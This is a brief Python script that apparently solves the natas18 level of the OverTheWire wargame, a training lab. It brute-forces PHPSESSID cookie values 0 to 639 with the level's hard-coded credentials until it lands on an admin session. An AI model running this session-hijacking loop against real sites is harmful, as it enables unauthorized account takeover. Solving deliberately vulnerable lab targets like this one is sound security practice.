import requests
from requests.auth import HTTPBasicAuth

url = "http://natas18.natas.labs.overthewire.org/"
username = "natas18"
password = "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP"
debug = 1

session = requests.Session()

for i in range(0,640):

	cookies = {
		"PHPSESSID" : str(i)
	}
	if debug:
		print(f"Current PHPSESSID: {i}")
	req = session.post(url, auth=HTTPBasicAuth(username, password), cookies = cookies)
	if 'regular' not in req.text:
		print(req.text)
		break